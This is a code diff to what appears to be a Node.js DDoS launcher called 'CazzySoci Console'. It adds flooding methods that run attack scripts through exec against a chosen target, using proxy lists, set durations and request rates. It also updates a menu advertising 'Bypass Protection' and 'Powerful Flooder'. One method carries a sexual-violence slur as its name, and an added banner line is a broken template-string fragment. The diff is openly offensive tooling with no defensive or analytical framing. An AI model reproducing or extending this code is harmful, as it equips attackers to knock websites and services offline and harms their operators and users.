@@ -298,11 +298,20 @@ const tls = path.join(__dirname, `/lib/cache/tls.js`);
 const strike = path.join(__dirname, `/lib/cache/strike.js`);
 const kill = path.join(__dirname, `/lib/cache/kill.js`);
 const bypass = path.join(__dirname, `/lib/cache/bypass.js`);
-const slim = path.join(__dirname, `/lib/cache/raw.js`);
-const raw = path.join(__dirname, `/lib/cache/thunder.js`);
+const raw = path.join(__dirname, `/lib/cache/raw.js`);
+const thunder = path.join(__dirname, `/lib/cache/thunder.js`);
+const rape = path.join(__dirname, `/lib/cache/rape.js`);
+const storm = path.join(__dirname, `/lib/cache/storm.js`);
         exec(`node ${flood} ${target} ${duration} 100 1 proxy.txt`)
         exec(`node ${tls} ${target} ${duration} 100 1 proxy.txt`)
         exec(`node ${strike} ${duration} 1 proxy.txt 70 ${target}`)
+	exec(`node ${kill} ${target} ${duration} 100 10`)
+	exec(`node ${bypass} ${target} ${duration} 100 10 proxy.txt`)
+	exec(`node ${flood} ${target} ${duration} 100 1 proxy.txt`)
+	  TARGET : ` + parsedTarget.host + `
+       DURATION : ` + args.time + `
+       THREADS : ` + args.threads + `
+       RPS : `
           sigma()
           } else {
     console.log(`Method ${methods} not recognized.`);
@@ -607,7 +616,7 @@ permen.question('[\x1b[1m\x1b[32mCazzySoci Console\x1b[0m]: \n', (input) => {
 || storm      || The Raining Request
 || rape       || Bypass Protection
 || destroy    || Kill That Socket
-|| slim       || Oh Is Fit There
+|| flooder    || Powerful Flooder
 [=========================================]
 `);
     sigma();
